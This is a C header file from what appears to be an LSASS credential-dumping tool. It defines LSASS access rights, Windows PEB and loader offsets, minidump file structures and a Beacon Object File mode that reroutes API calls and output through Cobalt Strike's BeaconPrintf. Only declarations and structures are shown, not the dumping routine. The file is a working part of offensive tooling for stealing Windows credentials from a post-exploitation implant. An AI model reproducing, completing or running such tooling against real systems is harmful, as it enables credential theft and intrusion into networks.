#pragma once

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <time.h>

#define LSASS_PERMISSIONS PROCESS_QUERY_INFORMATION|PROCESS_VM_READ

#define LSASS "LSASS"

#if _WIN64
 #define PROCESS_PARAMETERS_OFFSET 0x20
 #define OSMAJORVERSION_OFFSET 0x118
 #define OSMINORVERSION_OFFSET 0x11c
 #define OSBUILDNUMBER_OFFSET 0x120
 #define OSPLATFORMID_OFFSET 0x124
 #define CSDVERSION_OFFSET 0x2e8
 #define PROCESSOR_ARCHITECTURE AMD64
#else
 #define PROCESS_PARAMETERS_OFFSET 0x10
 #define OSMAJORVERSION_OFFSET 0xa4
 #define OSMINORVERSION_OFFSET 0xa8
 #define OSBUILDNUMBER_OFFSET 0xac
 #define OSPLATFORMID_OFFSET 0xb0
 #define CSDVERSION_OFFSET 0x1f0
 #define PROCESSOR_ARCHITECTURE INTEL
#endif

#define RVA(type, base_addr, rva) (type)((ULONG_PTR) base_addr + rva)
#ifndef offsetof
 #define offsetof(a,b) ((ULONG_PTR)(&(((a*)(0))->b)))
#endif

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define ARRAY_SIZE(a) (sizeof(a)/sizeof((a)[0]))
#ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define STATUS_PARTIAL_COPY 0x8000000D
#define STATUS_ACCESS_DENIED 0xC0000022
#define STATUS_OBJECT_PATH_NOT_FOUND 0xC000003A
#define STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034
#define STATUS_OBJECT_NAME_INVALID 0xc0000033
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define STATUS_INVALID_CID 0xC000000B
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_OBJECT_PATH_SYNTAX_BAD 0xC000003B

#define SystemHandleInformation 0x10
#define ObjectTypeInformation 2

#define CALLBACK_FILE       0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09

#define MEM_COMMIT 0x1000
//#define MEM_IMAGE 0x1000000
#define MEM_MAPPED 0x40000
#define PAGE_NOACCESS 0x01
#define PAGE_GUARD 0x100

// 200 MiB
#define DUMP_MAX_SIZE 0xc800000
// 900 KiB
#define CHUNK_SIZE 0xe1000

#ifdef _M_IX86
 // x86 has conflicting types with these functions
 #define NtClose _NtClose
 #define NtQueryInformationProcess _NtQueryInformationProcess
 #define NtCreateFile _NtCreateFile
 #define NtQuerySystemInformation _NtQuerySystemInformation
 #define NtQueryObject _NtQueryObject
 #define NtWaitForSingleObject _NtWaitForSingleObject
#endif

#ifdef _WIN64
 #define CID_OFFSET 0x40
 #define PEB_OFFSET 0x60
 #define READ_MEMLOC __readgsqword
#else
 #define CID_OFFSET 0x20
 #define PEB_OFFSET 0x30
 #define READ_MEMLOC __readfsdword
#endif

#ifdef BOF
 WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
 WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
 WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree (HANDLE, DWORD, PVOID);
 WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI VOID   WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);

 WINBASEAPI wchar_t * __cdecl MSVCRT$wcsstr(const wchar_t *_Str,const wchar_t *_SubStr);
 WINBASEAPI char *    __cdecl MSVCRT$strrchr(const char *_Str,int _Ch);
 WINBASEAPI void *    __cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
 WINBASEAPI size_t    __cdecl MSVCRT$strnlen(const char *s, size_t maxlen);
 WINBASEAPI size_t    __cdecl MSVCRT$wcsnlen(const wchar_t *_Src,size_t _MaxCount);
 WINBASEAPI wchar_t * __cdecl MSVCRT$wcscpy(wchar_t * __restrict__ __dst, const wchar_t * __restrict__ __src);
 WINBASEAPI size_t    __cdecl MSVCRT$mbstowcs(wchar_t * __restrict__ _Dest,const char * __restrict__ _Source,size_t _MaxCount);
 WINBASEAPI wchar_t * __cdecl MSVCRT$wcsncat(wchar_t * __restrict__ _Dest,const wchar_t * __restrict__ _Source,size_t _Count);
 WINBASEAPI int       __cdecl MSVCRT$strncmp(const char *s1, const char *s2, size_t n);
 WINBASEAPI int       __cdecl MSVCRT$_wcsicmp(const wchar_t *_Str1,const wchar_t *_Str2);
 WINBASEAPI void      __cdecl MSVCRT$srand(int initial);
 WINBASEAPI int       __cdecl MSVCRT$rand();
 WINBASEAPI time_t    __cdecl MSVCRT$time(time_t *time);
 WINBASEAPI void      __cdecl MSVCRT$memset(void *dest, int c, size_t count);
 WINBASEAPI size_t    __cdecl MSVCRT$strlen(const char *s);
 WINBASEAPI char *    __cdecl MSVCRT$strncpy(char * __restrict__ __dst, const char * __restrict__ __src, size_t __n);
 WINBASEAPI char *    __cdecl MSVCRT$strcat(char * __restrict__ _Dest,const char * __restrict__ _Source);

 #define GetProcessHeap KERNEL32$GetProcessHeap
 #define HeapAlloc      KERNEL32$HeapAlloc
 #define HeapFree       KERNEL32$HeapFree
 #define GetLastError   KERNEL32$GetLastError
 #define Sleep          KERNEL32$Sleep

 #define wcsstr   MSVCRT$wcsstr
 #define strrchr  MSVCRT$strrchr
 #define memcpy   MSVCRT$memcpy
 #define strnlen  MSVCRT$strnlen
 #define wcsnlen  MSVCRT$wcsnlen
 #define wcscpy   MSVCRT$wcscpy
 #define mbstowcs MSVCRT$mbstowcs
 #define wcsncat  MSVCRT$wcsncat
 #define strncmp  MSVCRT$strncmp
 #define _wcsicmp MSVCRT$_wcsicmp
 #define srand    MSVCRT$srand
 #define rand     MSVCRT$rand
 #define time     MSVCRT$time
 #define memset   MSVCRT$memset
 #define strlen   MSVCRT$strlen
 #define strncpy  MSVCRT$strncpy
 #define strcat   MSVCRT$strcat
#endif

#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) HeapFree(GetProcessHeap(), 0, addr)

#if defined(BOF)
 #define PRINT(...) { \
     BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
 }
#else
 #define PRINT(...) { \
     fprintf(stdout, __VA_ARGS__); \
     fprintf(stdout, "\n"); \
 }
#endif

#if defined(BOF)
 #define PRINT_ERR(...) { \
     BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
 }
#else
 #define PRINT_ERR(...) { \
     fprintf(stdout, __VA_ARGS__); \
     fprintf(stdout, "\n"); \
 }
#endif

#if defined(DEBUG) && defined(BOF)
 #define DPRINT(...) { \
     BeaconPrintf(CALLBACK_OUTPUT, "DEBUG: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
     BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
 }
#elif defined(DEBUG) && !defined(BOF)
 #define DPRINT(...) { \
     fprintf(stderr, "DEBUG: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
     fprintf(stderr, __VA_ARGS__); \
     fprintf(stderr, "\n"); \
 }
#else
 #define DPRINT(...)
#endif

#if defined(DEBUG) && defined(BOF)
 #define DPRINT_ERR(...) { \
     BeaconPrintf(CALLBACK_ERROR, "ERROR: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
     BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
 }
#elif defined(DEBUG) && !defined(BOF)
 #define DPRINT_ERR(...) { \
     fprintf(stderr, "ERROR: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
     fprintf(stderr, __VA_ARGS__); \
     fprintf(stderr, "\n"); \
 }
#else
 #define DPRINT_ERR(...)
#endif

#define syscall_failed(syscall_name, status) \
    DPRINT_ERR( \
        "Failed to call %s, status: 0x%lx", \
        syscall_name, \
        status \
    )

#define function_failed(function) \
    DPRINT_ERR( \
        "Failed to call '%s', error: %ld", \
        function, \
        GetLastError() \
    )

#define malloc_failed() function_failed("HeapAlloc")

#define MINIDUMP_SIGNATURE 0x504d444d
#define MINIDUMP_VERSION 42899
#define MINIDUMP_IMPL_VERSION 0

#define SIZE_OF_HEADER 32
#define SIZE_OF_DIRECTORY 12
#ifdef _WIN64
 #define SIZE_OF_SYSTEM_INFO_STREAM 48
#else
 #define SIZE_OF_SYSTEM_INFO_STREAM 56
#endif
#define SIZE_OF_MINIDUMP_MODULE 108

enum StreamType
{
    SystemInfoStream = 7,
    ModuleListStream = 4,
    Memory64ListStream = 9,
};

enum ProcessorArchitecture
{
    AMD64 = 9,
    INTEL = 0,
};

enum MiniDumpType
{
    MiniDumpNormal = 0,
};

typedef struct _MiniDumpHeader
{
     ULONG32       Signature;
     SHORT         Version;
     SHORT         ImplementationVersion;
     ULONG32       NumberOfStreams;
     ULONG32       StreamDirectoryRva;
     ULONG32       CheckSum;
     ULONG32       Reserved;
     ULONG32       TimeDateStamp;
     ULONG32       Flags;
} MiniDumpHeader, *PMiniDumpHeader;

typedef struct _MiniDumpDirectory
{
     ULONG32       StreamType;
     ULONG32       DataSize;
     ULONG32       Rva;
} MiniDumpDirectory, *PMiniDumpDirectory;

typedef struct _dump_context
{
    HANDLE  hProcess;
    PVOID   BaseAddress;
    ULONG32 rva;
    SIZE_T  DumpMaxSize;
    ULONG32 Signature;
    SHORT   Version;
    SHORT   ImplementationVersion;
} dump_context, *Pdump_context;

typedef struct _MiniDumpSystemInfo
{
    SHORT ProcessorArchitecture;
    SHORT ProcessorLevel;
    SHORT ProcessorRevision;
    char    NumberOfProcessors;
    char    ProductType;
    ULONG32 MajorVersion;
    ULONG32 MinorVersion;
    ULONG32 BuildNumber;
    ULONG32 PlatformId;
    ULONG32 CSDVersionRva;
    SHORT SuiteMask;
    SHORT Reserved2;
#if _WIN64
        ULONG64 ProcessorFeatures1;
        ULONG64 ProcessorFeatures2;
#else
        ULONG32 VendorId1;
        ULONG32 VendorId2;
        ULONG32 VendorId3;
        ULONG32 VersionInformation;
        ULONG32 FeatureInformation;
        ULONG32 AMDExtendedCpuFeatures;
#endif
} MiniDumpSystemInfo, *PMiniDumpSystemInfo;

struct _RTL_BALANCED_NODE
{
    union
    {
        struct _RTL_BALANCED_NODE* Children[2];                             //0x0
        struct
        {
            struct _RTL_BALANCED_NODE* Left;                                //0x0
            struct _RTL_BALANCED_NODE* Right;                               //0x8
        };
    };
    union
    {
        struct
        {
            UCHAR Red:1;                                                    //0x10
            UCHAR Balance:2;                                                //0x10
        };
        ULONGLONG ParentValue;                                              //0x10
    };
};

struct LDR_DATA_TABLE_ENTRY
{
    //struct _LIST_ENTRY InLoadOrderLinks;                                    //0x0
    struct _LIST_ENTRY InMemoryOrderLinks;                                  //0x10
    struct _LIST_ENTRY InInitializationOrderLinks;                          //0x20
    PVOID DllBase;                                                          //0x30
    PVOID EntryPoint;                                                       //0x38
    ULONG32 SizeOfImage;                                                      //0x40
    struct _UNICODE_STRING FullDllName;                                     //0x48
    struct _UNICODE_STRING BaseDllName;                                     //0x58
    UCHAR FlagGroup[4];                                                     //0x68
    USHORT ObsoleteLoadCount;                                               //0x6c
    USHORT TlsIndex;                                                        //0x6e
    struct _LIST_ENTRY HashLinks;                                           //0x70
    ULONG TimeDateStamp;                                                    //0x80
    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;                //0x88
    VOID* Lock;                                                             //0x90
    struct _LDR_DDAG_NODE* DdagNode;                                        //0x98
    struct _LIST_ENTRY NodeModuleLink;                                      //0xa0
    struct _LDRP_LOAD_CONTEXT* LoadContext;                                 //0xb0
    VOID* ParentDllBase;                                                    //0xb8
    VOID* SwitchBackContext;                                                //0xc0
    struct _RTL_BALANCED_NODE BaseAddressIndexNode;                         //0xc8
    struct _RTL_BALANCED_NODE MappingInfoIndexNode;                         //0xe0
    ULONGLONG OriginalBase;                                                 //0xf8
    union _LARGE_INTEGER LoadTime;                                          //0x100
    ULONG BaseNameHashValue;                                                //0x108
    ULONG32 LoadReason;                                                     //0x10c
    ULONG ImplicitPathOptions;                                              //0x110
    ULONG ReferenceCount;                                                   //0x114
    ULONG DependentLoadFlags;                                               //0x118
    UCHAR SigningLevel;                                                     //0x11c
    ULONG CheckSum;                                                         //0x120
};

typedef struct _VsFixedFileInfo
{
    ULONG32 dwSignature;
    ULONG32 dwStrucVersion;
    ULONG32 dwFileVersionMS;
    ULONG32 dwFileVersionLS;
    ULONG32 dwProductVersionMS;
    ULONG32 dwProductVersionLS;
    ULONG32 dwFileFlagsMask;
    ULONG32 dwFileFlags;
    ULONG32 dwFileOS;
    ULONG32 dwFileType;
    ULONG32 dwFileSubtype;
    ULONG32 dwFileDateMS;
    ULONG32 dwFileDateLS;
} VsFixedFileInfo, *PVsFixedFileInfo;

typedef struct _MiniDumpLocationDescriptor
{
    ULONG32 DataSize;
    ULONG32 rva;
} MiniDumpLocationDescriptor, *PMiniDumpLocationDescriptor;

typedef struct _MiniDumpModule
{
    ULONG64 BaseOfImage;
    ULONG32 SizeOfImage;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG32 ModuleNameRva;
    VsFixedFileInfo VersionInfo;
    MiniDumpLocationDescriptor CvRecord;
    MiniDumpLocationDescriptor MiscRecord;
    ULONG64 Reserved0;
    ULONG64 Reserved1;
} MiniDumpModule, *PMiniDumpModule;

typedef struct _MiniDumpMemoryDescriptor64
{
    struct _MiniDumpMemoryDescriptor64* next;
    ULONG64 StartOfMemoryRange;
    ULONG64 DataSize;
    DWORD   State;
    DWORD   Protect;
    DWORD   Type;
} MiniDumpMemoryDescriptor64, *PMiniDumpMemoryDescriptor64;
